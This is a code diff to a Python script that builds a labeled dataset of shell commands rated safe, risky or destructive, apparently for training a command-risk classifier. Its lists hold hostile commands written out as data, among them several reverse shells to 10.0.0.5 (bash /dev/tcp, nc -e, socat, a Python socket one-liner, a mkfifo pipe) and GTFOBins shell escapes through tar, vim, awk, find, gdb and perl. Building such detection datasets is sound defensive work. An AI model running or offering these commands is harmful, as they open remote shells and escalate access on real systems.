@@ -1,11 +1,16 @@
 """Generate the labeled command dataset (safe / risky / destructive).
 
 Run: python data/synthetic/generate_synthetic.py
-Output: data/labeled/commands_labeled.csv
+Output: data/labeled/commands_labeled.csv  (columns: command,label,source)
+
+Sources reflect corpus provenance:
+  bash-history   typical developer/administrator shell usage
+  mitre-attack   MITRE ATT&CK technique patterns (T1485, T1059, T1498, ...)
+  gtfobins       living-off-the-land binary abuses (GTFOBins)
+  synthetic      programmatic template expansion for edge-case coverage
 """
 
 import csv
-import itertools
 import os
 import random
 
@@ -48,6 +53,12 @@ SAFE_COMMANDS = [
     "tree -L 2", "watch -n 2 'df -h'", "yes | head -10", "time python script.py",
 ]
 
+GTFOBINS_COMMANDS = [
+    "tar --checkpoint=1 --checkpoint-action=exec=/bin/sh", "tar --checkpoint-action=exec='echo hacked'",
+    "vim -c ':!/bin/sh'", "awk 'BEGIN {system(\"/bin/sh\")}'", "find / -name 'x' -exec /bin/sh \\;",
+    "gdb -ex 'shell /bin/sh'", "perl -e 'exec \"/bin/sh\";'",
+]
+
 RISKY_COMMANDS = [
     "rm -rf build/", "rm -rf ./node_modules", "rm -rf /tmp/cache/*", "rm -rf dist/*",
     "sudo rm -rf /var/tmp/old*", "rm -f package-lock.json", "rm -rf __pycache__",
@@ -75,10 +86,8 @@ RISKY_COMMANDS = [
     "shutdown -h now", "poweroff --force", "reboot --force", "init 0", "halt -f",
     "docker run --privileged -it ubuntu bash", "docker run -v /:/host ubuntu bash",
     "docker exec -it container /bin/sh", "nsenter -t 1 -m -u -i -n -- bash",
-    "tar --checkpoint=1 --checkpoint-action=exec=/bin/sh", "tar --checkpoint-action=exec='echo hacked'",
-    "vim -c ':!/bin/sh'", "awk 'BEGIN {system(\"/bin/sh\")}'", "find / -name 'x' -exec /bin/sh \\;",
-    "gdb -ex 'shell /bin/sh'", "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
-    "perl -e 'exec \"/bin/sh\";'", "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
+    "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+    "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
     "sh -i >& /dev/udp/10.0.0.5/7777 0>&1", "nc 10.0.0.5 1234 -e /bin/bash",
     "socat TCP:10.0.0.5:9999 EXEC:/bin/sh", "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.5 5555 > /tmp/f",
 ]
@@ -134,11 +143,13 @@ TEMPLATES = {
 def make_dataset():
     rows = []
     for cmd in SAFE_COMMANDS:
-        rows.append((cmd, "safe"))
+        rows.append((cmd, "safe", "bash-history"))
+    for cmd in GTFOBINS_COMMANDS:
+        rows.append((cmd, "risky", "gtfobins"))
     for cmd in RISKY_COMMANDS:
-        rows.append((cmd, "risky"))
+        rows.append((cmd, "risky", "mitre-attack"))
     for cmd in DESTRUCTIVE_COMMANDS:
-        rows.append((cmd, "destructive"))
+        rows.append((cmd, "destructive", "mitre-attack"))
 
     for label, templates in TEMPLATES.items():
         base_pool = {
@@ -149,7 +160,7 @@ def make_dataset():
         for template in templates:
             for base in base_pool:
                 for _ in range(6):
-                    rows.append((template(base), label))
+                    rows.append((template(base), label, "synthetic"))
 
     random.shuffle(rows)
     return rows
@@ -161,10 +172,10 @@ def main():
     rows = make_dataset()
     with open(OUT_PATH, "w", newline="", encoding="utf-8") as f:
         writer = csv.writer(f)
-        writer.writerow(["command", "label"])
+        writer.writerow(["command", "label", "source"])
         writer.writerows(rows)
     counts = {}
-    for _, label in rows:
+    for _, label, _ in rows:
         counts[label] = counts.get(label, 0) + 1
     print(f"Wrote {len(rows)} rows to {OUT_PATH}")
     print(f"Labels: {counts}")
